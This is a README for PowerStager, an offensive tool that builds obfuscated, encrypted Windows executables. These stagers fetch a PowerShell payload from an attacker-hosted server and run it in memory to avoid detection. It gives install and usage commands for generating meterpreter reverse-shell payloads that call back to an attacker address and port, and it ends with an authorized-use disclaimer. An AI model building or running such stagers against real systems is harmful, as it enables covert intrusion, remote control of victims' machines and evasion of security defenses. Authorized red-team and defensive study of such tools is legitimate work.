PowerStager: This script creates an executable stager that downloads a selected powershell payload.
===================================================================================================

Sneak Peek
----------
An update to PowerStager is on it's way. Here is a short sneak peek:

[![powerstager sneak peek](https://d1ckdm8qo2u5d0.cloudfront.net/ai/videos/15651711/thumb-160x.jpg?v2r1495997991)](https://vid.me/A2N7 "powerstager sneak peek - Click to Watch!")

Contact
-------
* Author: z0noxz
* Source: https://github.com/z0noxz/powerstager
* Email: z0noxz@mail.com

Description
-----------
This script creates an executable stager that downloads a selected powershell payload, loads it into memory and executes it using obfuscated EC methods. The script will also encrypt the stager for dynamic signatures and some additional obfuscation.

This enables the actual payload to be executed indirectly without the victim downloading it, only by executing the stager. The attacker can then for example implement evasion techniques on the web server, hosting the payload, instead of in the stager itself.

Additional methods allows the payload to be embedded into the 'stager' and temporarily stored encrypted on disk for memory injection.

Not only are powershell powerful when managing Windows, it's also powerful when exploiting Windows. This script exploits multiple Windows features such as its inherit trust of powershell, interpretation of shorthand syntaxes, code evaluation and more...

How to use
----------

Install it:

	git clone https://github.com/z0noxz/powerstager
	cd powerstager
	sudo ./setup.py install

Generate a meterpreter payload to upload:

	powerstager -t win64 -o out.ps1 -m --lhost 13.37.13.37 --lport 4444 --generate
	powerstager -t win64 -o out.exe -u <url pointing the the uploaded payload>

Generate an embedded meterpreter payload:

	powerstager -t win64 -o out.exe -m --lhost 13.37.13.37 --lport 4444

Generate an embedded custom payload:

	powerstager -t win64 -o out.exe -p input.ps1

## DISCLAIMER:
You shall not misuse this tool to gain unauthorized access. This tool should only be used to expand knowledge, and not for causing malicious or damaging attacks. Performing any attacks without written permission from the owner of the system is illegal.
